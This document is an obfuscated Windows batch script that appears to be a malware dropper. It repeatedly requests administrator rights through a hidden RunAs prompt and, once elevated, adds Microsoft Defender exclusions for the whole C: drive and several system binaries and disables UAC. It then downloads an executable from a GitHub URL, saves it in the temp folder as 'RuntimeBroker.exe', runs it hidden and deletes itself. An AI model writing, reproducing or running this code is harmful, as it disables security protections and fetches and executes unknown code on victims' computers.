@echo off & setlocal enableDelayedExpansion
set "SPJ=>nul" & set "NgnlD=2>&1" & set "qPj=NET" & set "nLaY=SESSION"
%qPj% %nLaY% %SPJ% %NgnlD%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "YQw=qux" & set "cefzc=bar" & set "UYArb=baz" & set "Bmud=foo" & rem JlIMt WwDeQ jhwBBs
set "QeB=powershell -ExecutionPolicy Bypass -Command"
set "Frtz=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "Jtmj='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "asvq='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!QeB! "!Frtz! !Jtmj! !asvq!" %SPJ% %NgnlD%
set "Kgns=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "uZg=-Name 'EnableLUA' -Value 0"
!QeB! "!Kgns! !uZg!" %SPJ% %NgnlD%
set "Tzwzd=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!QeB! "!Tzwzd!" %SPJ% %NgnlD%
if !errorlevel! neq 0 (goto %a%)
set "Nta=timeout /t" & !Nta! 2 %SPJ% %NgnlD%
set "yPTKy=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "iIbDK=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Qah=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!QeB! "!yPTKy! !iIbDK! !Qah!" %SPJ% %NgnlD%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Nta! 1 %SPJ% %NgnlD% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %SPJ% %NgnlD%
del /f /q "%~f0" %SPJ% %NgnlD%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %SPJ% %NgnlD%
if !errorlevel! neq 0 (!Nta! 3 %SPJ% %NgnlD% & goto %b%)
exit /b
